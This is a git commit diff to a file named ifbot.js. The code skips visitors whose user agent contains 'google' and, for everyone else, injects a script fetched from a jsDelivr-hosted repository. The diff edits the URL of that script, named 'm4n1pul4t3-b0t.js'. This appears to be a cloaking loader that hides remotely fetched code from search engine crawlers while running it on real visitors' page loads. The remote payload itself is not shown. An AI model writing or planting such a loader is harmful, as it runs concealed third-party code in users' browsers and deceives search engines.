54dbf9182102f6b89beeaed8bcade2cfd488c93f
rezaaryam <68484809+rezaaryam@users.noreply.github.com>
2020-07-22 10:22:43 +0700

    Update ifbot.js

--- js/ifbot.js
+++ js/ifbot.js
@@ -2,6 +2,6 @@ if ((navigator.userAgent.includes("google") || navigator.userAgent.includes("Goo
 //todo nothing
 } else {
 var jsdlvr = document.createElement('script');
-jsdlvr.src = "https://cdn.jsdelivr.net/gh/rezaaryam/hostfile/js/m4n1pul4t3-b0tZ.js";
+jsdlvr.src = "https://cdn.jsdelivr.net/gh/rezaaryam/hostfile/js/m4n1pul4t3-b0t.js";
 document.getElementsByTagName("head")[0].appendChild(jsdlvr);
 }
